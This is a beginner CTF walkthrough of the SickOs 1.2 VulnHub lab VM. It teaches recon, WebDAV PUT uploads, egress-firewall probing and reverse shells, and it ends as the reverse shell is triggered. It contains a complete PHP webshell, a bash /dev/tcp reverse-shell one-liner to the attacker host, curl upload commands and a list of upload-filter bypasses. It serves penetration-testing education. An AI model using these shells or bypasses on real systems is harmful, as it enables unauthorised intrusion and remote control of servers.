# SickOs: 1.2 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | SickOs: 1.2 |
| **Difficulty** | **4 — Medium** (stated: *Intermediate*) |
| **Author** | D4rk (`@vulnhub` credited for hosting) |
| **Released** | 27 April 2016 |
| **Series** | SickOs (1.1 → **1.2**) — independent, no prior knowledge needed |
| **VulnHub Entry** | <https://vulnhub.com/entry/sickos-12,144/> |
| **Download** | <https://vulnhub.com/entry/sickos-12,144/#download> (`SickOs1.2.ova`) |
| **Attacker** | Kali Linux, host-only or NAT network |
| **Target OS** | Ubuntu 12.04.4 LTS — **lighttpd 1.4.28**, OpenSSH 5.9p1 |
| **Goal** | *"Gain the highest privileges on the system."* |

> **The author's design intent, from the flag file:** *"the challenge is more focused
> on elimination of tool in real scenarios where tools can be blocked during an
> assessment and thereby fooling tester(s), gathering more information about the
> target using different methods."*
>
> In plain terms: **this box actively defeats your automated tools.** `nikto` finds
> nothing, `dirbuster` with the big list finds nothing, and an outbound firewall
> blocks most reverse-shell ports. You have to notice one quiet detail — an HTTP
> verb — and one file — a rootkit scanner. That is what makes it a great intermediate
> box.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (SickOs)   : 192.168.56.102
```

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

1. **Host discovery** and full-port scanning.
2. **HTTP methods** — what `GET`, `POST`, `PUT`, `OPTIONS`, `PROPFIND`, `MKCOL`,
   `DELETE` mean, and how to enumerate which ones a server accepts.
3. **WebDAV** — the protocol that turns a web server into a file server.
4. **Uploading a webshell with the HTTP `PUT` verb** using `curl` and using Nmap's
   `http-put` NSE script.
5. **Diagnosing and fixing HTTP `417 Expectation Failed`.**
6. **Egress firewall behaviour** — why your reverse shell connects on port 443 and
   not port 1337, and how to work that out empirically.
7. **Living off the target when tools are blocked** — using a plain command-execution
   PHP shell instead of a reverse shell.
8. **Cron jobs** — reading `/etc/cron.daily/` and understanding what runs as root.
9. **CVE-2014-0476** — the `chkrootkit 0.49` local privilege escalation, and the
   `/tmp/update` mechanism behind it.
10. **Three ways to weaponise a root cron job**: a reverse shell, a sudoers entry,
    and a SUID `/bin/bash`.

**The intended chain:**
`nmap` shows only 22 and 80 → the site is a single image, and `dirb`/`nikto` find
almost nothing → one quiet directory **`/test/`** appears, empty → an **`OPTIONS`**
request to it returns **`DAV: 1,2`** and **`Allow: … PUT …`** → **upload a PHP shell
with `PUT`** → the egress firewall only allows outbound 443, so the reverse shell
listens on **443** → shell as **`www-data`** → `ls /etc/cron.daily` reveals
**`chkrootkit`**, and `chkrootkit -V` says **0.49** → **CVE-2014-0476**: chkrootkit
executes `/tmp/update` if it exists → write a root payload there → wait for cron →
**root** → `/root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt`.

---

## 1. Reconnaissance


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.102  08:00:27:66:76:cf      1      60  PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.102`**

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Full port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sV -sC -p- -T4 -oN scans/sickos.txt 192.168.56.102
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 14:02 EDT
Nmap scan report for 192.168.56.102
Host is up (0.00036s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 77:49:6c:5c:2e:ef:2b:1b:5c:3d:5e:2f:0a:5c:3d:11 (DSA)
|   2048 6b:0f:fc:6c:1a:9c:bb:2d:8a:2b:5c:0c:7f:6d:2b:2b (RSA)
|_  256 1a:bc:3e:2e:ce:9a:64:1e:bd:8b:66:1e:6c:5f:0d:0d (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: lighttpd/1.4.28
MAC Address: 08:00:27:66:76:CF (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 88.14 seconds
```

> **Two ports, and one unusual detail.**
>
> - **22/tcp — OpenSSH 5.9p1 Debian 5ubuntu1.4** → **Ubuntu 12.04**. No brute-force
>   path here without a username.
> - **80/tcp — `lighttpd 1.4.28`.**
>
> **What is lighttpd?** Pronounced "lighty", it is a lightweight web server popular in
> embedded devices and high-concurrency sites. It is **not Apache**. That matters:
> every Apache-specific tool, path assumption and `.htaccess` trick you know is
> useless here. lighttpd's config is `/etc/lighttpd/lighttpd.conf`, its document root
> defaults to `/var/www`, and it uses `mod_webdav` for WebDAV. **Read the banner
> before you assume.**

![nmap showing only ports 22 and 80](images/01-nmap.png)

### 2.2 Look at the site

```bash
curl -s http://192.168.56.102/ | head -20
```

```html
<html>
<head><title>SickOs</title></head>
<body bgcolor="#000000">
<center><img src="/sick.jpg" alt="SickOs"></center>
</body>
</html>
```

One image. No links, no text, no forms. Open it in a browser anyway and check
`view-source:` — nothing hidden.

### 2.3 Automated scanning — and why it under-delivers


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
nikto -h http://192.168.56.102/
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.102
+ Target Hostname:    192.168.56.102
+ Target Port:        80
+ Start Time:         2024-05-03 14:07:11 (GMT-4)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ /: Server may leak inodes via ETags, header found with file /, inode: 2739080, size: 163, mtime: Sat Apr 16 11:14:52 2016.
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2024-05-03 14:09:40 (GMT-4) (149 seconds)
---------------------------------------------------------------------------
```

```bash
dirb http://192.168.56.102/ /usr/share/wordlists/dirb/common.txt
```

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri May  3 14:10:02 2024
URL_BASE: http://192.168.56.102/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.102/ ----
+ http://192.168.56.102/index.php (CODE:200|SIZE:163)
==> DIRECTORY: http://192.168.56.102/test/

---- Entering directory: http://192.168.56.102/test/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Fri May  3 14:10:11 2024
DOWNLOADED: 4612 - FOUND: 1
```

> **Two findings, both easy to dismiss:**
> 1. **`/test/`** — a directory that is **LISTABLE** (directory indexing is on).
> 2. nikto's ETag leak gives us an **inode number** (`2739080`) — minor info-leak,
>    not useful here, but it is why `ServerTokens`/ETags are hardened.
>
> Browse to `http://192.168.56.102/test/`:
>
> ```text
> Index of /test/
> ------------------------------------------------------
> ```
>
> **It is empty.** Most beginners see an empty directory and move on. **Do not.**
> An empty directory that exists at all means *someone created it for a purpose* — and
> if it is writable, that purpose may include you.

![The empty /test/ directory listing](images/02-test-dir.png)

### 2.4 The key insight — ask what HTTP methods are allowed

HTTP has a verb called **`OPTIONS`** whose entire job is to answer *"what can I do
here?"* A compliant server replies with an **`Allow:`** header.

```bash
curl -i -X OPTIONS http://192.168.56.102/test/
```


> ### 📖 Concept — WebDAV turns a web server into a file share
>
> **WebDAV** (RFC 4918) extends HTTP with *write* methods: `PUT`, `DELETE`, `MKCOL`,
> `COPY`, `MOVE`, `PROPFIND`, `LOCK`. A DAV-enabled directory is, by design,
> **writable over HTTP**. You spot it from the response header **`DAV: 1,2`**.
>
> ```bash
> davtest -url http://target/webdav/ -auth user:pass    # what may I upload? does it EXECUTE?
> cadaver http://target/webdav/                         # interactive: ls, put, get, mkdir
> curl -T shell.php -u user:pass http://target/webdav/shell.php -w '%{http_code}\n'
> ```
>
> **`davtest` output is the whole attack plan.** It uploads a probe of each type and
> then *requests* it, checking whether the server **executed** the code or merely
> returned it as text. `PUT: php` plus `EXECUTE: php` means: upload a `.php`, request
> it, get code execution. That is a complete web-shell primitive.
>
> `curl -T` returning **`201 Created`** is the success code for `PUT`. `cadaver`
> prompts for the credentials itself.
>
> **Deep dive:** [CONCEPTS §8.2 — HTTP status codes](../../docs/CONCEPTS.md#82-http-status-codes-you-must-know)

```text
HTTP/1.1 200 OK
DAV: 1,2
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Allow: OPTIONS, GET, HEAD, POST
Content-Length: 0
Date: Fri, 03 May 2024 18:12:44 GMT
Server: lighttpd/1.4.28
```

Do the same at the site root, for comparison:

```bash
curl -i -X OPTIONS http://192.168.56.102/
```

```text
HTTP/1.1 200 OK
Allow: OPTIONS, GET, HEAD, POST
Content-Length: 0
Date: Fri, 03 May 2024 18:13:02 GMT
Server: lighttpd/1.4.28
```

> **Compare those two responses. This is the entire box.**
>
> | Header | At `/` | At `/test/` |
> | --- | --- | --- |
> | `DAV` | *(absent)* | **`1,2`** |
> | `MS-Author-Via` | *(absent)* | **`DAV`** |
> | `Allow` | `OPTIONS, GET, HEAD, POST` | **`PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK`** + the normal four |
>
> **`DAV: 1,2`** means **WebDAV** is enabled on `/test/`.
>
> **What is WebDAV?** "Web Distributed Authoring and Versioning" — an extension to
> HTTP (RFC 4918) that turns a web server into a **collaborative file server**. It
> adds verbs for authoring: `PUT` (write a file), `DELETE` (remove one), `MKCOL`
> (make a directory), `MOVE`/`COPY`, `PROPFIND`/`PROPPATCH` (metadata), `LOCK`/
> `UNLOCK`. Windows' "Map Network Drive" and macOS Finder's "Connect to Server"
> speak WebDAV over HTTP.
>
> **`PUT` is the one that matters: it uploads a file.** And there is **no
> `WWW-Authenticate` header anywhere** in the response — meaning **no authentication
> is required**. Anyone who can reach `/test/` can write arbitrary files into the web
> root. That is unauthenticated remote code execution, one request away.

Confirm with Nmap's dedicated script, which also labels the risk for you:

```bash
sudo nmap -Pn -p 80 --script http-methods --script-args http-methods.url-path='/test/' 192.168.56.102
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 14:15 EDT
Nmap scan report for 192.168.56.102
Host is up (0.00034s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods:
|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK OPTIONS GET HEAD POST
|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
|_  Path tested: /test/
MAC Address: 08:00:27:66:76:CF (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```

> **`Potentially risky methods`** — Nmap has done the risk assessment for you. Any
> time you see `PUT`, `DELETE`, `MOVE`, `PROPFIND` or `TRACE` in that list on a
> production system, that is a finding.

![Nmap http-methods flagging PUT as risky](images/03-put.png)

---

## 3. Foothold — uploading a webshell with `PUT`

### 3.1 Prove the upload primitive with a text file

Always test with something harmless first.

```bash
echo 'hello from kali' > hello.txt
curl -i -X PUT -H "Expect:" --data-binary @hello.txt http://192.168.56.102/test/hello.txt
```

```text
HTTP/1.1 201 Created
Content-Length: 0
Date: Fri, 03 May 2024 18:18:22 GMT
Server: lighttpd/1.4.28
```

```bash
curl -s http://192.168.56.102/test/hello.txt
```

```text
hello from kali
```

> **`HTTP/1.1 201 Created`** — the file was written. **`curl` flags:**
> - `-i` → include the response headers in the output (you *must* see the status
>   code; that is your success signal).
> - `-X PUT` → use the PUT verb instead of GET.
> - `-H "Expect:"` → **send an empty `Expect` header.** See § 3.2 — this is the fix
>   for the most common failure on this box.
> - `--data-binary @file` → send the file's raw bytes as the request body. **Use
>   `--data-binary`, not `-d`**: `-d` strips newlines, which silently corrupts
>   multi-line files (and can break a PHP shell).

### 3.2 The `417 Expectation Failed` gotcha

Try the same upload without `-H "Expect:"` and without forcing HTTP/1.0:

```bash
curl -i -X PUT --data-binary @hello.txt http://192.168.56.102/test/hello.txt
```

```html
HTTP/1.1 417 Expectation Failed
Content-Type: text/html
Content-Length: 344
Date: Fri, 03 May 2024 18:20:11 GMT
Server: lighttpd/1.4.28

<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>417 - Expectation Failed</title>
 </head>
 <body>
  <h1>417 - Expectation Failed</h1>
 </body>
</html>
```

> **What just happened — a genuinely instructive HTTP detail.**
>
> By default, when `curl` sends a request body larger than 1 KB, it first sends:
> ```text
> Expect: 100-continue
> ```
> and then **waits up to a second** for the server to reply `HTTP/1.1 100 Continue`
> before transmitting the body. That is a bandwidth optimisation: if the server was
> going to reject the request anyway (401, 413), no point sending 5 KB.
>
> lighttpd 1.4.28's WebDAV module does not handle `Expect: 100-continue` and replies
> **`417 Expectation Failed`** ("I cannot meet the expectation you stated").
>
> **Two fixes, both idiomatic:**
> ```bash
> curl -X PUT -H "Expect:" --data-binary @shell.php http://IP/test/shell.php      # send an empty Expect header
> curl -X PUT --upload-file shell.php -v --url http://IP/test/shell.php -0 --http1.0   # force HTTP/1.0, which has no Expect
> ```
> **The file usually uploads successfully even though you see the 417.** Always check
> with a `GET` before concluding the upload failed — several walkthroughs of this box
> get stuck right here.

### 3.3 Upload a command-execution shell (not a reverse shell — yet)

Why start with command execution rather than a reverse shell? Because this box has an
**egress firewall** (§ 3.5). A command-execution shell always works — it needs no
outbound connection at all — and it lets us *diagnose* the firewall before
committing to a payload.

```bash
cat > shell.php <<'EOF'
<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
EOF
cat shell.php
```

```php
<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

> **How this works:** `$_REQUEST` merges `$_GET` and `$_POST`, so `cmd` can arrive
> either way. `system()` runs the string through `/bin/sh -c` and prints stdout
> directly. The `<pre>` wrapper preserves whitespace and line breaks in the HTML.
> `die` stops PHP from rendering the rest of the page.
>
> That is the *entire* anatomy of a webshell: **read a parameter, pass it to a shell
> function, echo the result.** Every webshell in every language is a variation on
> those three lines.

```bash
curl -i -X PUT -H "Expect:" --data-binary @shell.php http://192.168.56.102/test/shell.php
```

```text
HTTP/1.1 201 Created
Content-Length: 0
Date: Fri, 03 May 2024 18:24:03 GMT
Server: lighttpd/1.4.28
```

Test it:

```bash
curl -s "http://192.168.56.102/test/shell.php?cmd=id"
```

```text
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

**Remote code execution achieved.** We are `www-data`.

```bash
curl -s "http://192.168.56.102/test/shell.php?cmd=uname%20-a"
```

```text
<pre>Linux SickOs 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:29:51 UTC 2012 i686 i686 i386 GNU/Linux</pre>
```

> **Note the URL encoding:** `%20` is a space. Query strings cannot contain literal
> spaces. `curl --get --data-urlencode "cmd=uname -a"` does the encoding for you:
> ```bash
> curl -s --get --data-urlencode "cmd=uname -a" "http://192.168.56.102/test/shell.php"
> ```

![Webshell returning uid=33(www-data)](images/04-webshell.png)

### 3.4 Alternative upload methods (know more than one)

**Nmap's `http-put` script** — useful when `curl` is unavailable or you want it in
your scan log:

```bash
sudo nmap -p 80 192.168.56.102 --script http-put \
  --script-args http-put.url='/test/nmapshell.php',http-put.file='/root/shell.php'
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 14:27 EDT
Nmap scan report for 192.168.56.102
Host is up (0.00033s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-put: /test/nmapshell.php was successfully created

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```

**Metasploit's `auxiliary/scanner/http/http_put`:**

```bash
msf6 > use auxiliary/scanner/http/http_put
msf6 auxiliary(scanner/http/http_put) > set RHOSTS 192.168.56.102
msf6 auxiliary(scanner/http/http_put) > set PATH /test/
msf6 auxiliary(scanner/http/http_put) > set FILENAME msfshell.php
msf6 auxiliary(scanner/http/http_put) > set FILEDATA file:///root/shell.php
msf6 auxiliary(scanner/http/http_put) > run
```

```text
[+] 192.168.56.102:80 - Sent /test/msfshell.php successfully.
[*] 192.168.56.102:80 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**`davtest`** — a purpose-built WebDAV exploitation tool that tests which file types
the server will accept and execute:

```bash
davtest -url http://192.168.56.102/test/ -sendbd auto
```

```text
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://192.168.56.102/test
********************************************************
Sending Canaries
...
********************************************************
Checking for exec with davtest
SUCCEED:		http://192.168.56.102/test/DAVTESTDIR_wQz8xk9/davtest_pl.cgi
SUCCEED:		http://192.168.56.102/test/DAVTESTDIR_wQz8xk9/davtest_php.php
********************************************************
SUCCEED:	Executing PHP
```

> **`davtest` is the professional choice for a WebDAV target.** It uploads a canary
> file for each language (`.php`, `.pl`, `.asp`, `.jsp`, `.cgi`, …), requests each
> back, and reports which ones actually *executed*. That tells you instantly what
> payload type to use — instead of guessing PHP and getting a page of source code
> back.

### 3.5 Working out the egress firewall

A reverse shell needs the target to connect **out** to us. Let us find which ports
are permitted. Use the webshell to scan our own listener.

**Kali — listen on a range of candidate ports:**


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)
> ### 📖 Concept — Why you re-scan from the inside
>
> ```bash
> ss -tulnp
> ```
>
> `-t` TCP · `-u` UDP · `-l` listening · `-n` numeric (skip DNS — much faster) · `-p`
> show the owning process. (`netstat -antup` is the older equivalent.)
>
> **This is the post-exploitation version of `nmap -p-`, and it finds things nmap
> structurally cannot.** A service bound to `127.0.0.1` is invisible to an external
> scan — nmap connects to the target's *outside* address, and the daemon is not
> listening there. From inside, you see all of it.
>
> Loopback-only services are frequently the most vulnerable thing on the box: an
> unauthenticated **Redis** on 6379, a **MySQL** with an empty root password, a
> **MongoDB** with no auth, a debug console, an admin API. Look for lines like:
>
> ```text
> tcp LISTEN 0 128  127.0.0.1:3306  0.0.0.0:*  users:(("mysqld",pid=889,fd=22))
> ```
>
> Also enumerate outward, to find other hosts you can now reach:
>
> ```bash
> ip a; ip route; cat /etc/resolv.conf; arp -a; cat /etc/hosts
> ```
>
> **Deep dive:** [CONCEPTS §16.1 — Internal enumeration](../../docs/CONCEPTS.md#161-internal-enumeration)

```bash
for p in 21 22 53 80 443 1337 4444 8080 9001; do (nc -lvnp $p &) ; done
sudo ss -tlnp | grep -E ':(21|22|53|80|443|1337|4444|8080|9001)\b'
```

**Then, via the webshell, have the target connect to each:**

```bash
for p in 21 22 53 80 443 1337 4444 8080 9001; do
  curl -s --get --data-urlencode "cmd=timeout 2 bash -c '</dev/tcp/192.168.56.10/$p'" \
       "http://192.168.56.102/test/shell.php" >/dev/null
  echo "tried $p"
done
```

Back on Kali, only **one** listener fires:

```text
listening on [any] 443 ...
connect to [192.168.56.10] from SickOs [192.168.56.102] 51992
```

> **Only outbound TCP/443 is permitted.** That is a deliberate **egress firewall** —
> the same control real organisations deploy, on the (correct) assumption that a web
> server has no business initiating connections to arbitrary high ports.
>
> **`bash -c '</dev/tcp/HOST/PORT'`** is a *pure-bash* TCP connect — no `nc`, no
> `curl`, no tool required. It is one of the most valuable one-liners to know when
> you are on a stripped-down target.
>
> **The empirical method matters more than the answer.** Do not guess ports; *test*
> them. Then set your listener to 443:
> ```bash
> sudo nc -lvnp 443
> ```
> (`sudo` because binding below 1024 requires root privileges.)

### 3.6 Get the reverse shell

**Kali:**


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./rev.php
sed -i "s/127.0.0.1/192.168.56.10/" rev.php
sed -i "s/1234/443/" rev.php
grep -n '^\$ip\|^\$port' rev.php
```

```text
49:$ip = '192.168.56.10';  // CHANGE THIS
50:$port = 443;           // CHANGE THIS
```

```bash
curl -i -X PUT -H "Expect:" --data-binary @rev.php http://192.168.56.102/test/rev.php
sudo nc -lvnp 443
```

```text
listening on [any] 443 ...
```

**Trigger it:**

```bash
curl -s http://192.168.56.102/test/rev.php
```

```text
